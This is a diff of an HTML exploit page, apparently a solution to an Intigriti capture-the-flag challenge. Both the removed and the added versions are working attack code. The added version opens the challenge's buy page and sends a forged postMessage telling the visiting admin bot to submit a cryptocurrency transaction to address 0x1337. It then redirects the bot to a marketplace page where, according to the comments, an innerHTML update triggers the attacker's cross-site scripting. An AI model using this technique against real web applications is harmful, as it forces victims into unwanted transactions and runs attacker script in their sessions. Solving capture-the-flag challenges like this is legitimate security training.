@@ -1,25 +1,28 @@
 <!DOCTYPE html>
 <html>
 <body>
-    <iframe id="target" src="https://challenge-0126.intigriti.io/buy.html?currency=BTC&price=1" width="0" height="0"></iframe>
     <script>
-        const ifr = document.getElementById('target');
-        
-        function send() {
-            ifr.contentWindow.postMessage({
-                type: 'submitTransaction',
-                transaction: { toAddress: '0x1337', currency: 'BTC', amount: 0.000001 }
-            }, '*');
-        }
+        // 1. Open the buy page for 1337COIN
+        const win = window.open("https://challenge-0126.intigriti.io/buy.html?currency=1337COIN&price=1");
 
-        // Send the message every second for 10 seconds
-        let interval = setInterval(send, 1000);
-
-        // After 10 seconds, move the WHOLE bot to the dashboard
         setTimeout(() => {
-            clearInterval(interval);
-            window.location.href = "https://challenge-0126.intigriti.io/dashboard.html";
-        }, 10000);
+            // 2. Force the Admin to send a tiny bit of 1337COIN
+            // This ensures YOUR nickname appears at the top of the Marketplace
+            win.postMessage({
+                type: 'submitTransaction',
+                transaction: {
+                    toAddress: '0x1337',
+                    currency: '1337COIN',
+                    amount: 0.00000001
+                }
+            }, '*');
+
+            // 3. Redirect the Admin to the Marketplace
+            // This triggers the row.innerHTML = ... update which fires your XSS
+            setTimeout(() => {
+                win.location.href = "https://challenge-0126.intigriti.io/marketwatch.html";
+            }, 2000);
+        }, 4000);
     </script>
 </body>
 </html>
